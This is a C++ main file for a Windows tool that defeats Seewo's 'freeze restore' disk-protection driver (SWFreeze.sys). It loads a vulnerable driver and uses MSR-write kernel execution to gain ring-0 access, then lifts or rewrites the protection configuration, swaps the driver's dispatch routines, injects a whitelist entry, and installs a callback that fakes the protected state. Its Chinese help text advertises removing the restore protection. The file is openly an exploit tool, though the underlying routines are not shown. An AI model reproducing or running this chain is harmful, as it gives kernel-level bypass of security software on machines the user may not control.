#include "msrexec.hpp"
#include "core.hpp"
#include "vdm.hpp"
#include <cstdarg>
#include <locale.h>

#ifdef _M_IX86
#error "x86 compilation is not supported!"
#endif

DWORD volumeArguments = 0;

BOOLEAN InitVolumeArguments(PCHAR argv) {
    DWORD64 off = 0;
    for (int j = 0; j < strlen(argv); j++) {
        off = 1ull << (toupper(argv[j]) - 'A');
        if (strlen(argv) != 1 || off < 0 || off > 1 << 25) {
            return FALSE;
        }
        if (volumeArguments & off) {
            return FALSE;
        }
        volumeArguments |= off;
    }
    return TRUE;
}

TASK ArgumentsHandler(int argc, char** argv) {
    TASK task = TASK_HELP;
    if (argc < 2) {
        return task;
    }

    if (strcmp(argv[1], "config") == 0) {
        task = TASK_ERROR;

        for (int i = 2; i < argc; i++) {
            if (strcmp(argv[i], "-r") == 0) {
                task = TASK_MODIFY_CONFIG_BY_WHITE_LIST;
            }
            else if (strcmp(argv[i], "-x") == 0) {
                task = TASK_MODIFY_CONFIG_BY_MJ_FUNC;
            }
            else if (strcmp(argv[i], "-c") == 0) {
                task = TASK_MODIFY_CONFIG_BY_WHITE_LIST_EX;
            }
            else {
                if (!InitVolumeArguments(argv[i])) {
                    task = TASK_ERROR;
                    return task;
                }
            }
        }
        if (volumeArguments != 0) {
            volumeArguments |= 0x4;
        }
        return task;
    }
    else if (strcmp(argv[1], "flt") == 0) {
        task = TASK_INSTALL_FILE_FILTER;
        if (argc == 3 && strcmp(argv[2], "off") == 0) {
            volumeArguments = -1;
        }
        else {
            for (int i = 2; i < argc; i++) {
                if (!InitVolumeArguments(argv[i])) {
                    task = TASK_ERROR;
                    return task;
                }
            }
        }
        return task;
    }
    else if (strcmp(argv[1], "info") == 0) {
        task = TASK_GET_FREEZE_INFO;
        return task;
    }
    else if (strcmp(argv[1], "help") == 0) {
        task = TASK_HELP;
        return task;
    }
    else {
        task = TASK_ERROR;
        return task;
    }
}

BOOLEAN InitR0Executer() {
    const auto [drv_handle, drv_key, drv_status] = vdm::load_drv();
    if (drv_status != STATUS_SUCCESS && drv_status != STATUS_OBJECT_NAME_COLLISION)
    {
        printf("[-] Failed to load driver... reason -> 0x%x\n", drv_status);
        return FALSE;
    }
    else if (drv_handle == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to get driver handle... reason -> 0x%x\n", GetLastError());
        return FALSE;
    }

    printf("[*] drv handle -> 0x%x, drv key -> %s, drv status -> 0x%x\n", (ULONG)drv_handle, drv_key.c_str(), drv_status);
    printf("[*] ntoskrnl base address -> 0x%p\n", (PVOID)utils::kmodule::get_base("ntoskrnl.exe"));
    printf("[*] NtShutdownSystem -> 0x%p\n", (PVOID)utils::kmodule::get_export("ntoskrnl.exe", "NtShutdownSystem"));

    return TRUE;
}

BOOLEAN R0Executer(callback_t callback) {
    writemsr_t _write_msr =
        [&](std::uint32_t reg, std::uintptr_t value) -> bool
        {
            return vdm::writemsr(reg, value);
        };

    vdm::msrexec_ctx msrexec(_write_msr);
    if (!msrexec.success)
    {
        printf("[-] Failed to initialize msrexec...\n");
        return FALSE;
    }

    printf("[*] r3 -> r0...\n");
    msrexec.exec(callback);

    printf("%s", logBuf);
}

int __cdecl main(int argc, char** argv) {
    setlocale(LC_ALL, "");

    TASK task = ArgumentsHandler(argc, argv);
    switch (task) {
        case TASK_ERROR:
        {
            printf("[-] Invalid arguments. Use help for help...\n");
            return 1;
        }

        case TASK_HELP:
        {
            wprintf(L"Usage:\n");
            wprintf(L"config [options] <drive>           修改冰点还原配置\n");
            wprintf(L"  -r                               使用注入白名单的方式修改冰点配置 重启后生效\n");
            wprintf(L"  -c                               使用修改驱动保护状态的方式修改配置 立即生效\n");
            wprintf(L"  -x                               使用替换分发例程的方式修改冰点配置 立即生效\n");
            wprintf(L"  drive                            指定要修改的卷符号以空格分隔 若开启保护而未保护卷C则自动保护卷C\n");
            wprintf(L"\n");
            wprintf(L"flt <drive/off>                    模拟冰点还原状态 使用前确保加载SeewoKeLiteLady驱动 并关闭还原\n");
            wprintf(L"\n");
            wprintf(L"help                               显示帮助信息\n");
            wprintf(L"\n");
            wprintf(L"Example:\n");
            wprintf(L"  %hs config -c                    解除冰点还原\n", argv[0]);
            wprintf(L"  %hs config -r C D E              保护卷C D E\n", argv[0]);
            wprintf(L"  %hs flt C D E                    模拟还原保护卷C D E\n", argv[0]);
            wprintf(L"  %hs flt off                      关闭还原状态模拟\n", argv[0]);
            return 0;
        }

        case TASK_MODIFY_CONFIG_BY_MJ_FUNC:
        {
            if (!IsDriverLoaded(L"SWFreeze.sys")) return 1;
            if (!InitR0Executer()) return 1;
            if (!R0Executer(ModifyConfigByMjFunc)) return 1;
            if (!GenerateFreezeConfig(volumeArguments)) return 1;
            if (!WriteConfigFile(TRUE)) return 1;
            printf("[+] Finished\n");
            return 0;
        }

        case TASK_MODIFY_CONFIG_BY_WHITE_LIST:
        {
            if (!IsDriverLoaded(L"SWFreeze.sys")) return 1;
            GetConfigFileSectorInfo();
            if (!InitR0Executer()) return 1;
            if (!R0Executer(ModifyConfigByWhiteList)) return 1;
            if (!GenerateFreezeConfig(volumeArguments)) return 1;
            if (!WriteConfigFile(TRUE)) return 1;
            printf("[+] Finished\n");
            return 0;
        }

        case TASK_MODIFY_CONFIG_BY_WHITE_LIST_EX:
        {
            if (!IsDriverLoaded(L"SWFreeze.sys")) return 1;
            if (!InitR0Executer()) return 1;
            if (!R0Executer(ModifyConfigByWhiteListEx)) return 1;
            if (!GenerateFreezeConfig(volumeArguments)) return 1;
            if (!WriteConfigFile(TRUE)) return 1;
            printf("[+] Finished\n");
            return 0;
        }

        case TASK_INSTALL_FILE_FILTER:
        {
            if (!IsDriverLoaded(L"SWFreeze.sys")) return 1;
            if (!IsFilterDriverLoaded(L"SeewoKeLiteLady")) return 1;
            if (!GenerateFreezeConfig(volumeArguments)) return 1;
            if (!InitR0Executer()) return 1;
            if (!R0Executer(InstallCreateFileCallback)) return 1;
            if (volumeArguments != -1) {
                if (!InitRedirectFile()) return 1;
                if (!WriteConfigFile(FALSE)) return 1;
                if (!InitDllFile(volumeArguments)) return 1;
            }
            else {
                if (!DeleteDllFile()) return 1;
            }
            printf("[+] Finished\n");
            return 0;
        }

        case TASK_GET_FREEZE_INFO:
        {
            if (!IsDriverLoaded(L"SWFreeze.sys")) return 1;
            if (!InitVolumesInfoTable()) return 1;
            if (!InitR0Executer()) return 1;
            if (!R0Executer(GetFreezeInfo)) return 1;
            PrintVolumeInfo();
            printf("[+] Finished\n");
            return 0;
        }
    }
}
